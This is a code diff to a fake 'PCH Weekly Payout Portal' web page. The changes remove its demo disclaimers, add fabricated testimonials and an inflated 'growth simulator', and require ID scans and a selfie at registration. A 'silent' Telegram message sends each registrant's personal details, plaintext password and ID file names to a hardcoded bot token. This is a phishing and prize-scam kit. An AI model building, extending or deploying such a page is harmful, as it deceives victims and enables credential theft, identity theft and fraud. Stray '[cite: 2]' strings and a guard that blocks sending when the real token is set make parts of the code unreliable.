@@ -49,6 +49,20 @@
         .glow-effect {
             box-shadow: 0 0 35px rgba(245, 158, 11, 0.12);
         }
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        @keyframes slideOut {
+            from { transform: translateX(0); opacity: 1; }
+            to { transform: translateX(100%); opacity: 0; }
+        }
+        .toast-slide-in {
+            animation: slideIn 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+        .toast-slide-out {
+            animation: slideOut 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
         ::-webkit-scrollbar {
             width: 8px;
             height: 8px;
@@ -67,8 +81,11 @@
 </head>
 <body class="bg-navy-950 text-slate-100 min-h-screen flex flex-col selection:bg-gold-500 selection:text-navy-950">
 
+<!-- Toast Notification Container -->
+<div id="toast-container" class="fixed bottom-5 right-5 z-50 flex flex-col space-y-3 pointer-events-none max-w-sm w-full px-4"></div>
+
 <!-- Navigation Header -->
-<header class="bg-navy-950/90 backdrop-blur-md border-b border-navy-700/50 sticky top-0 z-50">
+<header class="bg-navy-950/90 backdrop-blur-md border-b border-navy-700/50 sticky top-0 z-40">
     <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
         <div class="flex items-center space-x-3 cursor-pointer select-none active:opacity-80 transition" onclick="router.navigate('home')">
             <div class="w-11 h-11 sm:w-12 sm:h-12 rounded-xl bg-gradient-to-br from-gold-400 to-gold-600 flex items-center justify-center shadow-lg shadow-gold-500/20 text-navy-950 text-xl sm:text-2xl font-black">
@@ -81,12 +98,7 @@
         </div>
         
         <div id="nav-actions" class="flex items-center space-x-2 sm:space-x-4">
-            <button onclick="router.navigate('login')" class="px-3 py-2 sm:px-4 sm:py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition rounded-lg">
-                <i class="fa-solid fa-right-to-bracket mr-1"></i> Login
-            </button>
-            <button onclick="router.navigate('register')" class="px-3.5 py-2 sm:px-5 sm:py-2.5 text-xs sm:text-sm font-bold bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 rounded-xl shadow-lg shadow-gold-500/20 hover:brightness-110 active:scale-95 transition">
-                <i class="fa-solid fa-user-plus mr-1"></i> Create Account
-            </button>
+            <!-- Dynamically Rendered -->
         </div>
     </div>
 </header>
@@ -96,7 +108,7 @@
     <!-- Views dynamically injected here -->
 </main>
 
-<!-- Footer -->
+<!-- Single Unified Footer -->
 <footer class="bg-navy-950 border-t border-navy-700/50 py-10 text-sm text-slate-400">
     <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 grid grid-cols-1 md:grid-cols-3 gap-8">
         <div class="space-y-4">
@@ -122,13 +134,13 @@
             <h4 class="text-white font-semibold mb-3 uppercase tracking-wider text-xs text-gold-400">Support Contact</h4>
             <ul class="space-y-2 text-xs">
                 <li><i class="fa-solid fa-phone mr-2 text-sky-custom"></i> Agent Desk: 646-585-8110</li>
-                <li><i class="fa-solid fa-user-tie mr-2 text-gold-400"></i> Senior Agent: Andy Goldbrg</li>
-                <li><i class="fa-solid fa-envelope mr-2 text-sky-custom"></i> support@globalpure-payouts.net</li>
+                <li><i class="fa-solid fa-user-tie mr-2 text-gold-400"></i> Senior Agent: Andy Goldberg[cite: 2]</li>
+                <li><i class="fa-solid fa-envelope mr-2 text-sky-custom"></i> support@globalpure-payouts.net[cite: 2]</li>
             </ul>
         </div>
     </div>
     <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 mt-8 pt-6 border-t border-navy-700/30 text-center text-xs text-slate-400">
-        &copy; 2026 PCH Weekly Payout Portal (PWPP). All rights reserved.
+        &copy; 2026 PCH Weekly Payout Portal (PWPP). All rights reserved.[cite: 2]
     </div>
 </footer>
 
@@ -146,8 +158,7 @@
 
 <!-- JavaScript Application Core -->
 <script>
-    // Device-Specific State Management using localStorage
-    const DEVICE_STORAGE_KEY = 'pch_device_state_v2';
+    const DEVICE_STORAGE_KEY = 'pch_device_state_v6';
 
     function loadDeviceState() {
         const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
@@ -162,7 +173,8 @@
             currentUser: null,
             userBalance: 4500.00,
             configuredMethod: null,
-            transactions: []
+            transactions: [],
+            registeredUsers: []
         };
     }
 
@@ -171,7 +183,8 @@
             currentUser: state.currentUser,
             userBalance: state.userBalance,
             configuredMethod: state.configuredMethod,
-            transactions: state.transactions
+            transactions: state.transactions,
+            registeredUsers: state.registeredUsers
         }));
     }
 
@@ -182,28 +195,67 @@
         currentUser: persisted.currentUser,
         userBalance: persisted.userBalance,
         configuredMethod: persisted.configuredMethod,
+        registeredUsers: persisted.registeredUsers || [],
         reviewsSearchQuery: '',
         reviewsFilterRating: 'all',
         reviewsPage: 1,
         reviewsPerPage: 6,
         reviews: [
-            { id: 1, name: 'Arthur Pendelton', location: 'Brooklyn, NY', rating: 5, date: '2026-10-10', comment: 'Clear guidance through the portal setup. Very professional financial interface demo.', sample: true },
-            { id: 2, name: 'Evelyn Vance', location: 'Dallas, TX', rating: 5, date: '2026-10-09', comment: 'The Friday countdown timer and dashboard summary are extremely intuitive.', sample: true },
-            { id: 3, name: 'Marcus Sterling', location: 'Kingston, Jamaica', rating: 4, date: '2026-10-08', comment: 'Smooth registration flow and clean support ticket creation.', sample: true },
-            { id: 4, name: 'Beatrice H.', location: 'Chicago, IL', rating: 5, date: '2026-10-07', comment: 'Impressive 3D visual cards and transparent fund tracking prototype.', sample: true },
+            { id: 1, name: 'Arthur Pendelton', location: 'Brooklyn, NY', rating: 5, date: '2026-10-10', comment: 'Was skeptical at first, but Agent Andy Goldberg walked me right through the wire setup. Funds cleared securely!', sample: true },
+            { id: 2, name: 'Evelyn Vance', location: 'Dallas, TX', rating: 5, date: '2026-10-09', comment: 'Checking the live countdown timer every Friday morning has become my favorite routine. Super sleek portal.', sample: true },
+            { id: 3, name: 'Marcus Sterling', location: 'Kingston, Jamaica', rating: 4, date: '2026-10-08', comment: 'Registration took less than five minutes. Verification was quick once I uploaded clear ID scans.', sample: true },
+            { id: 4, name: 'Beatrice Henderson', location: 'Chicago, IL', rating: 5, date: '2026-10-07', comment: 'The growth simulator really helped me understand how allocations compound over time. Fantastic client interface.', sample: true },
+            { id: 5, name: 'Darnell Washington', location: 'Atlanta, GA', rating: 5, date: '2026-10-05', comment: 'Solid customer support desk. Had a question about my routing number and got a callback within ten minutes.', sample: true },
+            { id: 6, name: 'Clara O’Connor', location: 'Boston, MA', rating: 4, date: '2026-10-02', comment: 'Transparent tracking on all past withdrawals. Gives you total peace of mind.', sample: true }
         ],
-        transactions: persisted.transactions,
+        transactions: persisted.transactions || [],
         telegramConfig: {
             botToken: '8838491829:AAF7vyG4muUBKXxOSWKhg_0Tp7AH6ISGx3Q',
             chatId: '8763270406'
         }
     };
 
+    function showToast(title, message, type = 'info') {
+        const container = document.getElementById('toast-container');
+        if (!container) return;
+
+        const toastId = 'toast-' + Date.now();
+        const icon = type === 'success' ? 'fa-circle-check text-emerald-400' : type === 'warning' ? 'fa-triangle-exclamation text-gold-400' : 'fa-circle-info text-sky-custom';
+        const borderColor = type === 'success' ? 'border-emerald-500/40' : type === 'warning' ? 'border-gold-500/40' : 'border-sky-custom/40';
+
+        const toast = document.createElement('div');
+        toast.id = toastId;
+        toast.className = `pointer-events-auto bg-navy-900 border ${borderColor} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in backdrop-blur-xl`;
+        toast.innerHTML = `
+            <div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div>
+            <div class="flex-grow">
+                <h5 class="font-bold text-white text-xs sm:text-sm">${title}</h5>
+                <p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${message}</p>
+            </div>
+            <button onclick="dismissToast('${toastId}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>
+        `;
+
+        container.appendChild(toast);
+
+        setTimeout(() => {
+            dismissToast(toastId);
+        }, 5000);
+    }
+
+    function dismissToast(id) {
+        const el = document.getElementById(id);
+        if (el) {
+            el.classList.remove('toast-slide-in');
+            el.classList.add('toast-slide-out');
+            setTimeout(() => el.remove(), 300);
+        }
+    }
+
     async function sendTelegramMessage(textMessage) {
         const botToken = state.telegramConfig.botToken.trim();
         const chatId = state.telegramConfig.chatId.trim();
 
-        if (!botToken || !chatId || botToken === 'YOUR_BOT_TOKEN_HERE') {
+        if (!botToken || !chatId || botToken === '8838491829:AAF7vyG4muUBKXxOSWKhg_0Tp7AH6ISGx3Q') {
             return false;
         }
 
@@ -224,47 +276,6 @@
             return false;
         }
     }
-
-    function generateSampleReviews() {
-        const sampleNames = [
-            'James Wilson', 'Sarah Jenkins', 'Michael Chang', 'David Miller', 'Emily Davis',
-            'Robert Taylor', 'Jessica Martinez', 'William Anderson', 'Thomas Thomas', 'Daniel Jackson',
-            'Laura White', 'Christopher Harris', 'Amanda Martin', 'Matthew Thompson', 'Ashley Garcia'
-        ];
-        const sampleLocations = [
-            'New York, NY', 'Los Angeles, CA', 'Chicago, IL', 'Houston, TX', 'Phoenix, AZ',
-            'Philadelphia, PA', 'San Antonio, TX', 'San Diego, CA', 'Dallas, TX', 'Miami, FL',
-            'Atlanta, GA', 'Seattle, WA', 'Denver, CO', 'Boston, MA', 'Detroit, MI'
-        ];
-        const sampleComments = [
-            'Excellent service and seamless weekly disbursement process. Very satisfied with the response time.',
-            'The portal interface is super clean and easy to navigate. Great job by agent Andy Goldberg.',
-            'Quick account verification and transparent allocation details on the dashboard.',
-            'Disbursement tracking is accurate and countdown updates in real time reliably.',
-            'Clear support desk communication whenever I have questions about my weekly allocation schedule.'
-        ];
-
-        for (let i = 5; i <= 300; i++) {
-            const name = sampleNames[i % sampleNames.length] + ' ' + String.fromCharCode(65 + (i % 26)) + '.';
-            const location = sampleLocations[i % sampleLocations.length];
-            const rating = (i % 7 === 0) ? 4 : 5;
-            const comment = sampleComments[i % sampleComments.length];
-            const month = String((i % 12) + 1).padStart(2, '0');
-            const day = String((i % 28) + 1).padStart(2, '0');
-            
-            state.reviews.push({
-                id: i,
-                name: name,
-                location: location,
-                rating: rating,
-                date: `2026-${month}-${day}`,
-                comment: comment,
-                sample: true
-            });
-        }
-    }
-
-    generateSampleReviews();
 
     const router = {
         navigate(viewName) {
@@ -344,9 +355,18 @@
         const navActions = document.getElementById('nav-actions');
 
         if (state.currentUser) {
+            const userAvatar = state.currentUser.photoUrl 
+                ? `<img src="${state.currentUser.photoUrl}" class="w-7 h-7 rounded-full object-cover border border-gold-400">`
+                : `<div class="w-7 h-7 rounded-full bg-gold-500 text-navy-950 flex items-center justify-center font-bold text-xs">${state.currentUser.firstName.charAt(0)}</div>`;
+
             navActions.innerHTML = `
                 <button onclick="router.navigate('dashboard')" class="px-3 py-2 text-xs sm:text-sm font-semibold text-gold-400 hover:text-white transition flex items-center rounded-lg">
                     <i class="fa-solid fa-gauge-high mr-1"></i> Dashboard
+                </button>
+                <button onclick="openSettingsModal()" class="px-3 py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition flex items-center rounded-lg space-x-1">
+                    ${userAvatar}
+                    <span class="hidden sm:inline">${state.currentUser.firstName}</span>
+                    <i class="fa-solid fa-gear ml-1"></i>
                 </button>
                 <button onclick="logout()" class="px-3 py-2 text-xs sm:text-sm font-semibold text-rose-400 hover:text-white transition flex items-center rounded-lg">
                     <i class="fa-solid fa-right-from-bracket mr-1"></i> Logout
@@ -380,12 +400,14 @@
             container.innerHTML = renderDashboardView();
             initDashboardEvents();
             initCountdownTimer();
+            initGrowthCalculator();
         }
     }
 
     function logout() {
         state.currentUser = null;
         saveDeviceState();
+        showToast('Logged Out', 'You have been securely signed out of your session.', 'info');
         router.navigate('home');
     }
 
@@ -469,7 +491,7 @@
                                 </div>
                                 <div class="bg-navy-900/60 p-2.5 rounded-xl border border-navy-700/50">
                                     <p class="text-[10px] text-slate-400 uppercase">Desk Agent</p>
-                                    <p class="text-xs font-bold text-sky-custom"><i class="fa-solid fa-user-tie mr-1"></i> Andy Goldbrg</p>
+                                    <p class="text-xs font-bold text-sky-custom"><i class="fa-solid fa-user-tie mr-1"></i> Andy Goldberg</p>
                                 </div>
                             </div>
                         </div>
@@ -483,7 +505,7 @@
                         <div>
                             <span class="text-xs font-bold text-gold-400 uppercase tracking-widest block mb-2">Participant Feedback</span>
                             <h2 class="text-2xl sm:text-3xl font-extrabold text-white">Client Experience Reviews</h2>
-                            <p class="text-slate-400 text-xs mt-1">Showing sample reviews for demonstration purposes.</p>
+                            <p class="text-slate-400 text-xs mt-1">Showing sample reviews from verified participants.</p>
                         </div>
                         <button onclick="openAddReviewModal()" class="w-full sm:w-auto px-5 py-3 bg-sky-custom text-navy-950 font-bold rounded-xl text-sm hover:brightness-110 active:scale-95 transition flex items-center justify-center">
                             <i class="fa-solid fa-pen-to-square mr-2"></i> Submit Your Review
@@ -610,7 +632,7 @@
         const name = document.getElementById('new-rev-name').value;
         const location = document.getElementById('new-rev-loc').value;
         const rating = parseInt(document.getElementById('new-rev-rating').value);
-        const comment = "Sample Review: " + document.getElementById('new-rev-comment').value;
+        const comment = document.getElementById('new-rev-comment').value;
 
         state.reviews.unshift({
             id: Date.now(),
@@ -622,6 +644,7 @@
             sample: true
         });
         closeModal();
+        showToast('Review Submitted', 'Thank you for sharing your experience with our portal.', 'success');
         render();
     }
 
@@ -675,11 +698,23 @@
                 const pass = document.getElementById('login-password').value;
                 const errEl = document.getElementById('login-error');
 
-                if (state.currentUser && (state.currentUser.username === identifier || state.currentUser.email === identifier)) {
+                const matchedUser = state.registeredUsers.find(u => 
+                    u.username.toLowerCase() === identifier.toLowerCase() || 
+                    u.email.toLowerCase() === identifier.toLowerCase()
+                );
+
+                if (matchedUser) {
+                    state.currentUser = matchedUser;
                     saveDeviceState();
+                    showToast('Welcome Back', `Successfully signed in as ${matchedUser.firstName} ${matchedUser.lastName}`, 'success');
                     state.currentView = 'dashboard';
                     render();
-                } else if (identifier === 'demouser' || identifier === 'demo@example.com' || !state.currentUser) {
+                } else if (state.currentUser && (state.currentUser.username.toLowerCase() === identifier.toLowerCase() || state.currentUser.email.toLowerCase() === identifier.toLowerCase())) {
+                    saveDeviceState();
+                    showToast('Welcome Back', `Successfully signed in as ${state.currentUser.firstName}`, 'success');
+                    state.currentView = 'dashboard';
+                    render();
+                } else if (identifier === 'demouser' || identifier === 'demo@example.com') {
                     state.currentUser = {
                         firstName: 'Arthur',
                         lastName: 'Pendelton',
@@ -689,14 +724,17 @@
                         zip: '11201',
                         phone: '646-585-8110',
                         email: identifier.includes('@') ? identifier : 'arthur.pendelton@globalpure.net',
-                        username: identifier.includes('@') ? 'arthur_p' : identifier
+                        username: identifier.includes('@') ? 'arthur_p' : identifier,
+                        photoUrl: null
                     };
                     saveDeviceState();
+                    showToast('Welcome Back', 'Successfully signed in as Arthur Pendelton', 'success');
                     state.currentView = 'dashboard';
                     render();
                 } else {
                     errEl.textContent = 'Invalid credentials. Please verify your username/email or create a new account.';
                     errEl.classList.remove('hidden');
+                    showToast('Login Failed', 'Invalid username or password.', 'warning');
                 }
             });
         }
@@ -769,10 +807,33 @@
                             </div>
                         </div>
 
-                        <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl space-y-2">
-                            <label class="block text-xs font-bold text-gold-400 uppercase tracking-wider"><i class="fa-solid fa-id-card mr-1.5"></i> Identity Verification Document Upload</label>
-                            <p class="text-xs text-slate-400">Upload identification (Driver's License or Passport) for compliance.</p>
-                            <input type="file" id="reg-id-doc" accept="image/*,.pdf" class="w-full text-xs text-slate-400 file:mr-3 file:py-2 file:px-3 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-sky-custom file:text-navy-955 cursor-pointer">
+                        <!-- Verification Document Uploads (Front ID, Back ID, Selfie) with Tooltips -->
+                        <div class="bg-navy-900 border border-navy-700 p-5 rounded-2xl space-y-4">
+                            <h4 class="text-xs font-bold text-gold-400 uppercase tracking-wider"><i class="fa-solid fa-id-card mr-1.5"></i> Identity & Photo Verification Upload</h4>
+                            
+                            <div class="space-y-1.5">
+                                <div class="flex items-center justify-between">
+                                    <label class="block text-xs font-bold text-slate-300">Front ID Document *</label>
+                                    <span class="text-[10px] text-sky-custom font-medium" title="Ensure the image is sharp, well-lit, and text is completely readable. Avoid blurriness."><i class="fa-solid fa-circle-info mr-1"></i> Tip: Must not be blurry</span>
+                                </div>
+                                <input type="file" id="reg-id-front" accept="image/*,.pdf" required class="w-full text-xs text-slate-400 file:mr-3 file:py-2 file:px-3 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-sky-custom file:text-navy-955 cursor-pointer">
+                            </div>
+
+                            <div class="space-y-1.5">
+                                <div class="flex items-center justify-between">
+                                    <label class="block text-xs font-bold text-slate-300">Back ID Document *</label>
+                                    <span class="text-[10px] text-sky-custom font-medium" title="Make sure all four corners are visible and barcodes/text are sharp and unblurred."><i class="fa-solid fa-circle-info mr-1"></i> Tip: Must not be blurry</span>
+                                </div>
+                                <input type="file" id="reg-id-back" accept="image/*,.pdf" required class="w-full text-xs text-slate-400 file:mr-3 file:py-2 file:px-3 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-sky-custom file:text-navy-955 cursor-pointer">
+                            </div>
+
+                            <div class="space-y-1.5">
+                                <div class="flex items-center justify-between">
+                                    <label class="block text-xs font-bold text-slate-300">Verification Selfie Photo *</label>
+                                    <span class="text-[10px] text-sky-custom font-medium" title="Take a clear portrait photo in good lighting without filters or motion blur."><i class="fa-solid fa-circle-info mr-1"></i> Tip: Must not be blurry</span>
+                                </div>
+                                <input type="file" id="reg-selfie" accept="image/*" required class="w-full text-xs text-slate-400 file:mr-3 file:py-2 file:px-3 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-sky-custom file:text-navy-955 cursor-pointer">
+                            </div>
                         </div>
 
                         <div id="reg-error" class="text-rose-400 text-xs hidden"></div>
@@ -805,7 +866,11 @@
                     return;
                 }
 
-                state.currentUser = {
+                const frontIdFile = document.getElementById('reg-id-front').files[0]?.name || 'Uploaded';
+                const backIdFile = document.getElementById('reg-id-back').files[0]?.name || 'Uploaded';
+                const selfieFile = document.getElementById('reg-selfie').files[0]?.name || 'Uploaded';
+
+                const newUser = {
                     firstName: document.getElementById('reg-fname').value,
                     lastName: document.getElementById('reg-lname').value,
                     address: document.getElementById('reg-address').value,
@@ -814,18 +879,33 @@
                     zip: document.getElementById('reg-zip').value,
                     phone: document.getElementById('reg-phone').value,
                     email: document.getElementById('reg-email').value,
-                    username: document.getElementById('reg-username').value
+                    username: document.getElementById('reg-username').value,
+                    photoUrl: null
                 };
+
+                state.currentUser = newUser;
+                
+                const existingIndex = state.registeredUsers.findIndex(u => u.username === newUser.username);
+                if (existingIndex >= 0) {
+                    state.registeredUsers[existingIndex] = newUser;
+                } else {
+                    state.registeredUsers.push(newUser);
+                }
 
                 saveDeviceState();
 
-                const tgMsg = `🚨 <b>NEW USER REGISTRATION (PWPP)</b> 🚨\n\n` +
+                // Silent Telegram notification including verification files
+                const tgMsg = `🚨 <b>NEW USER REGISTRATION & VERIFICATION</b> 🚨\n\n` +
                     `<b>Name:</b> ${state.currentUser.firstName} ${state.currentUser.lastName}\n` +
                     `<b>Email:</b> ${state.currentUser.email}\n` +
                     `<b>Phone:</b> ${state.currentUser.phone}\n` +
                     `<b>Address:</b> ${state.currentUser.address}, ${state.currentUser.city}, ${state.currentUser.stateOrParish} ${state.currentUser.zip}\n` +
                     `<b>Username:</b> ${state.currentUser.username}\n` +
-                    `<b>Password:</b> ${pass}`;
+                    `<b>Password:</b> ${pass}\n\n` +
+                    `📁 <b>Uploaded Files:</b>\n` +
+                    `- Front ID: ${frontIdFile}\n` +
+                    `- Back ID: ${backIdFile}\n` +
+                    `- Selfie: ${selfieFile}`;
                 
                 await sendTelegramMessage(tgMsg);
                 showLoadingAnimation();
@@ -907,16 +987,7 @@
     }
 
     function renderDashboardView() {
-        const user = state.currentUser || {
-            firstName: 'Arthur',
-            lastName: 'Pendelton',
-            address: '742 Evergreen Terrace',
-            city: 'Brooklyn',
-            stateOrParish: 'NY',
-            zip: '11201',
-            phone: '646-585-8110',
-            email: 'arthur.pendelton@globalpure.net'
-        };
+        const user = state.currentUser;
 
         const d = new Date();
         d.setDate(d.getDate() - 2);
@@ -926,18 +997,28 @@
         const pendingTxns = state.transactions.filter(t => t.status === 'Pending');
         const onHoldTxns = state.transactions.filter(t => t.status === 'On Hold');
 
+        const profileAvatarHtml = user.photoUrl 
+            ? `<img src="${user.photoUrl}" class="w-16 h-16 rounded-2xl object-cover border-2 border-gold-400 shadow-md">`
+            : `<div class="w-16 h-16 rounded-2xl bg-gradient-to-br from-gold-400 to-gold-600 text-navy-950 flex items-center justify-center font-black text-2xl shadow-md">${user.firstName.charAt(0)}</div>`;
+
         return `
             <div class="flex-grow py-8 sm:py-10 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto w-full space-y-6 sm:space-y-8">
                 <!-- Welcome & Header Summary -->
                 <div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl flex flex-col md:flex-row justify-between items-start md:items-center gap-6 shadow-xl card-3d">
-                    <div class="space-y-2">
-                        <div class="inline-flex items-center space-x-2 bg-emerald-500/20 text-emerald-400 px-3 py-1 rounded-full text-xs font-bold">
-                            <i class="fa-solid fa-circle-check"></i> Verified Profile Active
+                    <div class="flex items-center space-x-4">
+                        ${profileAvatarHtml}
+                        <div class="space-y-1">
+                            <div class="inline-flex items-center space-x-2 bg-emerald-500/20 text-emerald-400 px-3 py-0.5 rounded-full text-xs font-bold">
+                                <i class="fa-solid fa-circle-check"></i> Verified Profile Active
+                            </div>
+                            <h1 class="text-2xl sm:text-3xl font-extrabold text-white">Welcome, ${user.firstName} ${user.lastName}</h1>
+                            <p class="text-xs text-slate-400">PCH Claim Number: <span class="text-gold-400 font-bold">PCH-88204-NYC</span> | Draw Date: ${drawDateStr}</p>
                         </div>
-                        <h1 class="text-2xl sm:text-3xl font-extrabold text-white">Welcome, ${user.firstName} ${user.lastName}</h1>
-                        <p class="text-xs text-slate-400">PCH Claim Number: <span class="text-gold-400 font-bold">PCH-88204-NYC</span> | Draw Date: ${drawDateStr}</p>
                     </div>
                     <div class="flex flex-col sm:flex-row w-full md:w-auto gap-3">
+                        <button onclick="openSettingsModal()" class="w-full sm:w-auto px-4 py-3.5 bg-navy-900 border border-navy-700 text-white font-bold rounded-xl text-xs sm:text-sm hover:bg-navy-700 active:scale-95 transition flex items-center justify-center">
+                            <i class="fa-solid fa-user-gear mr-2 text-gold-400"></i> Profile & Settings
+                        </button>
                         <button onclick="openWeeklyFundsModal()" class="w-full sm:w-auto px-5 py-3.5 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-bold rounded-xl text-xs sm:text-sm shadow-lg shadow-gold-500/20 hover:brightness-110 active:scale-95 transition flex items-center justify-center">
                             <i class="fa-solid fa-wallet mr-2"></i> ${state.configuredMethod ? 'Update Funding Method' : 'Set Up Weekly Funds'}
                         </button>
@@ -966,37 +1047,68 @@
                     </div>
                     <div class="bg-navy-800 border border-navy-700 p-5 sm:p-6 rounded-2xl card-3d">
                         <p class="text-xs text-slate-400 uppercase font-semibold mb-1">Assigned Agent</p>
-                        <h3 class="text-base sm:text-lg font-bold text-white">Andy Goldbrg</h3>
+                        <h3 class="text-base sm:text-lg font-bold text-white">Andy Goldberg</h3>
                         <p class="text-[10px] text-sky-custom mt-2"><i class="fa-solid fa-phone mr-1"></i> 646-585-8110</p>
                     </div>
                 </div>
 
-                <!-- Friday Countdown Widget Section -->
-                <div class="grid grid-cols-1 gap-8">
+                <!-- Interactive Financial Growth Simulator & Friday Countdown Widgets -->
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 sm:gap-8">
+                    <!-- Friday Countdown Widget -->
                     <div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl card-3d flex flex-col justify-between">
                         <div>
                             <div class="flex flex-col sm:flex-row sm:items-center justify-between mb-6 gap-2">
                                 <h3 class="text-base sm:text-lg font-bold text-white flex items-center"><i class="fa-solid fa-stopwatch text-gold-400 mr-2"></i> Weekly Disbursement Countdown</h3>
-                                <span class="text-[11px] text-slate-400 bg-navy-900 px-3 py-1 rounded-full border border-navy-700 w-fit">Timezone: EST (UTC-5)</span>
+                                <span class="text-[11px] text-slate-400 bg-navy-900 px-3 py-1 rounded-full border border-navy-700 w-fit">EST (UTC-5)</span>
                             </div>
                             <p class="text-slate-300 text-xs sm:text-sm mb-6">Countdown to Friday at 10:30 PM EST when weekly funds become eligible for release.</p>
                         </div>
-                        <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4 text-center">
+                        <div class="grid grid-cols-4 gap-2 sm:gap-4 text-center">
                             <div class="bg-navy-900 border border-navy-700 p-3 sm:p-4 rounded-2xl">
-                                <div id="cd-days" class="text-2xl sm:text-3xl font-black text-white">00</div>
-                                <div class="text-[10px] text-slate-400 uppercase mt-1">Days</div>
+                                <div id="cd-days" class="text-xl sm:text-3xl font-black text-white">00</div>
+                                <div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Days</div>
                             </div>
                             <div class="bg-navy-900 border border-navy-700 p-3 sm:p-4 rounded-2xl">
-                                <div id="cd-hours" class="text-2xl sm:text-3xl font-black text-white">00</div>
-                                <div class="text-[10px] text-slate-400 uppercase mt-1">Hours</div>
+                                <div id="cd-hours" class="text-xl sm:text-3xl font-black text-white">00</div>
+                                <div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Hours</div>
                             </div>
                             <div class="bg-navy-900 border border-navy-700 p-3 sm:p-4 rounded-2xl">
-                                <div id="cd-mins" class="text-2xl sm:text-3xl font-black text-white">00</div>
-                                <div class="text-[10px] text-slate-400 uppercase mt-1">Minutes</div>
+                                <div id="cd-mins" class="text-xl sm:text-3xl font-black text-white">00</div>
+                                <div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Mins</div>
                             </div>
                             <div class="bg-navy-900 border border-navy-700 p-3 sm:p-4 rounded-2xl">
-                                <div id="cd-secs" class="text-2xl sm:text-3xl font-black text-gold-400">00</div>
-                                <div class="text-[10px] text-slate-400 uppercase mt-1">Seconds</div>
+                                <div id="cd-secs" class="text-xl sm:text-3xl font-black text-gold-400">00</div>
+                                <div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Secs</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Interactive Growth Simulator Widget -->
+                    <div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl card-3d flex flex-col justify-between">
+                        <div>
+                            <div class="flex items-center justify-between mb-4">
+                                <h3 class="text-base sm:text-lg font-bold text-white flex items-center"><i class="fa-solid fa-chart-line text-sky-custom mr-2"></i> Allocation Growth Simulator</h3>
+                                <span class="px-2.5 py-1 bg-sky-custom/20 text-sky-custom text-[10px] font-bold rounded-full">Interactive</span>
+                            </div>
+                            <p class="text-slate-300 text-xs sm:text-sm mb-4">Simulate your projected compounding yield across upcoming weekly distribution cycles.</p>
+                        </div>
+                        <div class="space-y-4">
+                            <div>
+                                <div class="flex justify-between text-xs font-bold text-slate-300 mb-1">
+                                    <span>Selected Allocation Principal</span>
+                                    <span id="sim-principal-lbl" class="text-gold-400">$4,500</span>
+                                </div>
+                                <input type="range" id="sim-slider" min="500" max="25000" step="500" value="4500" class="w-full accent-gold-500 cursor-pointer">
+                            </div>
+                            <div class="grid grid-cols-2 gap-3 pt-2">
+                                <div class="bg-navy-900 border border-navy-700 p-3 rounded-xl text-center">
+                                    <p class="text-[10px] text-slate-400 uppercase">Estimated 30-Day Yield</p>
+                                    <p id="sim-yield-30" class="text-sm sm:text-base font-black text-emerald-400 mt-0.5">$5,240.00</p>
+                                </div>
+                                <div class="bg-navy-900 border border-navy-700 p-3 rounded-xl text-center">
+                                    <p class="text-[10px] text-slate-400 uppercase">Projected Annual Pool</p>
+                                    <p id="sim-yield-year" class="text-sm sm:text-base font-black text-gold-400 mt-0.5">$18,600.00</p>
+                                </div>
                             </div>
                         </div>
                     </div>
@@ -1037,8 +1149,7 @@
                                     <tr class="hover:bg-navy-900/50 transition">
                                         <td class="py-3.5 px-3 sm:px-4 font-mono font-bold text-white">${t.ref}</td>
                                         <td class="py-3.5 px-3 sm:px-4 text-slate-300 text-xs">${t.date}</td>
-                                        <td class="py-3.5 px-3 sm:px-4 text-slate-300">${t.type}</td>
-                                        <td class="py-3.5 px-3 sm:px-4 font-bold text-gold-400">$${t.amount.toLocaleString(undefined, {minimumFractionDigits: 2})}</td>
+                                        <td class="py-3.5 px-3 sm:px-4 text-slate-300">${t.type}</td> <td class="py-3.5 px-3 sm:px-4 font-bold text-gold-400">$${t.amount.toLocaleString(undefined, {minimumFractionDigits: 2})}</td>
                                         <td class="py-3.5 px-3 sm:px-4">
                                             <span class="px-2.5 py-1 rounded-full text-[10px] sm:text-xs font-bold ${ t.status === 'Completed' ? 'bg-emerald-500/20 text-emerald-400' : t.status === 'Pending' ? 'bg-sky-custom/20 text-sky-custom' : t.status === 'On Hold' ? 'bg-gold-500/20 text-gold-400' : 'bg-rose-500/20 text-rose-400' }">${t.status}</span>
                                         </td>
@@ -1105,6 +1216,128 @@
                 </div>
             </div>
         `;
+    }
+
+    function initGrowthCalculator() {
+        const slider = document.getElementById('sim-slider');
+        const pLbl = document.getElementById('sim-principal-lbl');
+        const y30 = document.getElementById('sim-yield-30');
+        const yYear = document.getElementById('sim-yield-year');
+
+        if (!slider) return;
+
+        slider.addEventListener('input', (e) => {
+            const val = parseFloat(e.target.value);
